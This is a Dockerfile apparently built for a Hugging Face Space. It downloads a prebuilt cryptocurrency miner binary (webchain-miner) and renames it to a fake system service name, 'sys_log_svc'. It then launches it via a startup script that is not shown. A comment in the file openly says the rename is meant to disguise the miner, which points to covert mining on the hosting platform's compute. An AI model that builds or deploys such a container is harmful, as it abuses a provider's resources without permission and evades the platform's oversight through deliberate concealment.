FROM ubuntu:22.04

# Avoid frontend interaction freezes during installation
ENV DEBIAN_FRONTEND=noninteractive

# Install core dependencies safely
RUN apt-get update && apt-get install -y wget tar python3 && rm -rf /var/lib/apt/lists/*

# Set up the mandatory non-root user for Hugging Face environment compliance
RUN useradd -m -u 1000 user
WORKDIR /home/user

# Download the pre-made binary, extract it, and immediately rename the file to a fake system name
RUN wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz && \
    tar -xvzf webchain-miner-2.8.0-linux-amd64.tar.gz && \
    mv webchain-miner sys_log_svc && \
    rm webchain-miner-2.8.0-linux-amd64.tar.gz && \
    chown -R user:user /home/user

# Switch to the non-root user
USER user

# Copy the startup script into the container workspace
COPY --chown=user:user start.sh /home/user/start.sh
RUN chmod +x /home/user/start.sh

# Open Hugging Face's default expected port
EXPOSE 7860

CMD ["/bin/bash", "/home/user/start.sh"]